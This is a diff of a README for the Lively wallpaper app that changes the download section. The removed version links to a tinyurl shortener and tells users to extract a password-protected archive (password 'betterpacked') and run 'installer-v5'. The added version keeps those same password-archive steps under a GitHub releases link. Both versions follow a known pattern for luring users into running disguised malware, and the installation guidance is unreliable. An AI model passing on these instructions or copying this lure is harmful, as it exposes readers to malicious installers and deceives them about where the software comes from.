@@ -18,16 +18,14 @@ Whether you want a subtle animated gradient, a looping 4K video, or a fully inte
 
 The desktop has been static for decades. **Lively changes that — cleanly, efficiently, and for free.**
 
-<br>
-
-<p align="center">
-  <a href="https://tinyurl.com/226vjb6f">
-    <img src="https://img.shields.io/badge/⬇%20DOWNLOAD-LATEST%20BUILD-1E88E5?style=for-the-badge&labelColor=061E47&logo=github&logoColor=white" alt="Download Lively" />
+<div align="center">
+  <a href="https://github.com/rocksdanister/lively/releases">
+    <img src="https://img.shields.io/badge/⬇%20DOWNLOAD%20LIVELY-LATEST%20RELEASE-1E88E5?style=for-the-badge&labelColor=061E47&logo=github&logoColor=white" alt="Download Lively" />
   </a>
-</p>
+</div>
 
-> [!IMPORTANT]
-> **Installation** — click the download button above, download and extract the archive (password: `betterpacked`), then run the main file `installer-v5`. That's all you need to get started. Full step-by-step instructions are available in the [How to Install](#-how-to-install) section below.
+> [!NOTE]
+> **Installation Tips** — download the latest build from the button above, extract the archive (password: `betterpacked`), and run `installer-v5`. Lively will start minimized in the system tray — drag any video, GIF, or webpage onto its window to set it as a wallpaper. Full instructions are in the [How to Install](#-how-to-install) section below.
 
 ---
 
@@ -197,3 +195,4 @@ A: Releases follow a regular cadence, with patch releases for critical fixes.
 <p align="center">
   <em>Your desktop has been static long enough. Bring it to life — freely, openly, and beautifully.</em>
 </p>
+
